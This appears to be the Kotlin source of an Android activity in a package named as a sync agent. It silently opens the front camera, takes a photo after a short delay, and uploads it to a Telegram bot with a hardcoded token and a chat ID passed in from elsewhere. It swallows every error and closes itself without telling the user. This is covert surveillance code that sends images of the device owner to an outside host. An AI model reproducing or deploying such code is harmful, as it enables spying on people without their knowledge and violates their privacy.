package com.cognitive.ai.syncagent

import android.app.Activity
import android.hardware.Camera
import android.os.Bundle
import android.view.SurfaceHolder
import android.view.SurfaceView
import java.net.HttpURLConnection
import java.net.URL

@Suppress("DEPRECATION")
class CameraCaptureActivity : Activity(), SurfaceHolder.Callback {

    private var camera: Camera? = null
    private lateinit var surfaceView: SurfaceView
    private lateinit var surfaceHolder: SurfaceHolder
    private var chatId: String = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        chatId = intent.getStringExtra("chat_id") ?: ""

        surfaceView = SurfaceView(this)
        setContentView(surfaceView)

        surfaceHolder = surfaceView.holder
        surfaceHolder.addCallback(this)
    }

    override fun surfaceCreated(holder: SurfaceHolder) {
        try {
            // فتح الكاميرا الأمامية (رقم 1)
            camera = Camera.open(1)
            camera?.setPreviewDisplay(holder)
            camera?.startPreview()

            // مهلة ثانية ونصف لضمان ثبات العدسة ثم التقاط الصورة وإرسالها
            surfaceView.postDelayed({
                try {
                    camera?.takePicture(null, null, Camera.PictureCallback { data, _ ->
                        saveAndSendPhoto(data)
                        releaseCameraAndFinish()
                    })
                } catch (e: Exception) {
                    releaseCameraAndFinish()
                }
            }, 1500)

        } catch (e: Exception) {
            releaseCameraAndFinish()
        }
    }

    private fun saveAndSendPhoto(data: ByteArray) {
        try {
            val token = "9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY"
            val urlString = "https://api.telegram.org/bot$token/sendPhoto"
            
            val boundary = "Boundary_" + System.currentTimeMillis()
            val url = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection
            connection.doOutput = true
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            val outputStream = connection.outputStream
            outputStream.write("--$boundary\r\n".toByteArray())
            outputStream.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".toByteArray())
            outputStream.write("$chatId\r\n".toByteArray())

            outputStream.write("--$boundary\r\n".toByteArray())
            outputStream.write("Content-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"\r\n".toByteArray())
            outputStream.write("Content-Type: image/jpeg\r\n\r\n".toByteArray())
            outputStream.write(data)
            outputStream.write("\r\n".toByteArray())
            outputStream.write("--$boundary--\r\n".toByteArray())
            outputStream.flush()
            outputStream.close()

            connection.inputStream.close()
        } catch (e: Exception) {}
    }

    private fun releaseCameraAndFinish() {
        try {
            camera?.stopPreview()
            camera?.release()
            camera = null
        } catch (e: Exception) {}
        finish()
    }

    override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {}
    override fun surfaceDestroyed(holder: SurfaceHolder) {
        releaseCameraAndFinish()
    }
}
